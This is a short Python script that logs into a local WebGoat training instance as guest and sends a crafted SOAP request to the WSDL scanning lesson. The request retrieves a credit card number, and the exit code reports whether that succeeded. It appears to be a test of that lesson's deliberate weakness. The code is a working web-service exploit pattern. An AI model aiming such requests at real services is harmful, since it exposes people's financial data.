import requests

def main():
    # we need to authenticate to webgoat twice if webgoat was freshly started, as the WSDL server doesn't give the first
    # session a credit card number in its SOAP response
    try:
        run()
        run()
    except:
        exit(0)

    exit(0)

def attack(sessionCookie):
    url="http://127.0.0.1:8080/WebGoat/services/WSDLScanning"
    headers = {'content-type': 'text/xml',
               'SOAPAction': "",
               'Cookie': sessionCookie
               }
    body = """<?xml version='1.0' encoding='UTF-8'?>
<wsns0:Envelope
  xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'
  xmlns:xsd='http://www.w3.org/2001/XMLSchema'
  xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'>
  <wsns0:Body
    wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'>
    <wsns2:getCreditCard
          xmlns:wsns2='http://lessons.webgoat.owasp.org'>
      <id xsi:type='xsd:int'
          xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
      >101</id>
    </wsns2:getCreditCard>
  </wsns0:Body>
</wsns0:Envelope>"""

    response = requests.post(url,data=body,headers=headers)
    foundCreditCardNumber = '987654321' in response.content

    return foundCreditCardNumber

def run():
    # get the login page, yielding magic cookie #1
    url = "http://127.0.0.1:8080/WebGoat/login.mvc"
    r = requests.get(url)

    cookieOne = r.cookies['JSESSIONID']

    # login, yielding session cookie
    postURL = 'http://127.0.0.1:8080/WebGoat/j_spring_security_check'

    headers = {'Referer': 'http://127.0.0.1:8080/WebGoat/login.mvc',
               'Content-Type': 'application/x-www-form-urlencoded',
               'Host': '127.0.0.1:8080',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
               'Accept-Language': 'en-US,en;q=0.5',
               'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0',
        'Cookie': 'JSESSIONID=' + cookieOne }

    data = {'username': 'guest', 'password': 'guest'}
    hooks = dict(response=getCookieAndAttack)
    requests.post(postURL, data = data, headers=headers, hooks=hooks)

def getCookieAndAttack(r, *args, **kwargs):
    if(r.cookies):
        sessionCookie = r.cookies['JSESSIONID']
        if attack('JSESSIONID=' + sessionCookie):
            print('Found credit card number')
            exit(1)


if  __name__ =='__main__':main()